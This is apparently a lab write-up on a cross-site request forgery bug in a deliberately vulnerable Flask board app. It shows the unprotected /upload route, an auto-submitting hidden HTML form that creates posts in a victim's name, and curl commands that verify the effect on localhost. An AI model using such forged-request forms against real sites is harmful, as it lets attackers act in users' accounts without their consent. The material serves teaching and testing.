# post based csrf: creating a post through the victim's browser

## what the bug is

`/upload` accepts a `POST` request and changes database state, but it does not require a csrf token. A cross site page can therefore submit the same form fields while the victim's browser supplies the victim's Flask session cookie.

The route is registered in `logic/__init__.py`:

```python
@app.route("/upload", methods=["GET", "POST"])
def upload():
    if request.method == "POST":
        file = request.files.get("file")
        content = request.form.get("content")
        title = request.form.get("title")
        user_id = session.get("user_id")
        if not content or not title:
            return "Content and title are required.", 400
        if not user_id:
            return "You must be logged in to upload.", 401
        ...
        cursor.execute(sql_query)
        db.commit()
        ...
```

The route checks whether the browser has a logged in session. It does not check whether the `POST` came from the application's own upload page or whether the user intended to create a post.

## the normal request

When a logged in user submits the upload form, the browser sends form encoded data:

```http
POST /upload HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/x-www-form-urlencoded
Cookie: session=<victim's signed flask session cookie>

 title=hello&content=normal+post
```

Flask parses the body into `request.form`:

```python
request.form.get("title")   # "hello"
request.form.get("content") # "normal post"
session.get("user_id")      # for example, 3
```

The application then constructs this SQL string:

```sql
INSERT INTO posts (title, content, user_id)
VALUES ('hello', 'normal post', 3)
```

MySQL inserts the row. `db.commit()` makes the new post visible to later requests. The route returns:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

Post created successfully!
```

## the attacker form

A page controlled by csrfer can submit the same field names automatically:

```html
<form id="csrfForm" action="http://127.0.0.1:5000/upload" method="POST">
  <input type="hidden" name="title" value="ordinary title">
  <input type="hidden" name="content" value="post created without the user's intention">
</form>
<script>
  document.getElementById("csrfForm").submit();
</script>
```

The important detail is that the attacker does not need to read the response. The attacker only needs the browser to send the request. When the victim visits the attacker's page while logged in to vulnboard, the browser sends:

```http
POST /upload HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/x-www-form-urlencoded
Cookie: session=<victim's signed flask session cookie>

 title=ordinary+title&content=post+created+without+the+user%27s+intention
```

The `Cookie` header belongs to the victim. The form body belongs to the attacker. Flask does not distinguish them as different trust sources.

## what happens underneath the hood

The request moves through the application like this:

1. Flask matches `POST /upload` to `upload()`.
2. `request.form` returns the hidden `title` and `content` values.
3. `session.get("user_id")` returns the victim's logged in user id from the signed session cookie.
4. The route builds an `INSERT` statement using those values.
5. MySQL inserts a post owned by the victim's user id.
6. `db.commit()` permanently commits the change.
7. The response says `Post created successfully!`.

The resulting database row is conceptually:

```text
id       title             content                                  user_id
<new id> ordinary title   post created without intention             3
```

The attacker did not need the session signing key or the victim's password. The browser presented the valid session automatically.

## direct verification

First log in as a test user and save the session cookie:

```bash
curl -i -c victim.cookies -X POST http://127.0.0.1:5000/login \
  -d 'username=john' \
  -d 'password=known-password'
```

Then submit the same state changing request with that cookie:

```bash
curl -i -b victim.cookies -X POST http://127.0.0.1:5000/upload \
  -d 'title=csrf test' \
  -d 'content=created by a cross site form'
```

The expected response is:

```http
HTTP/1.1 200 OK

Post created successfully!
```

Requesting `/see` afterwards shows the inserted post. This reproduces the database effect without needing an external site.

## why this is csrf

The method being `POST` does not provide CSRF protection by itself. `POST` prevents accidental requests from some simple resource tags, but an attacker can still submit a normal HTML form. The missing control is an unpredictable token tied to the intended upload form.

The session check answers:

```text
is this browser logged in?
```

It does not answer:

```text
did this logged in user intentionally submit the upload form?
```

## verification checklist

| check | result |
|---|---|
| `/upload` accepts a state changing `POST` | yes |
| hidden fields can supply `title` and `content` | yes |
| the browser sends the victim's session cookie | yes, for the matching cookie policy |
| the route checks a csrf token | no |
| MySQL receives an `INSERT` | yes |
| `db.commit()` makes the post persistent | yes |
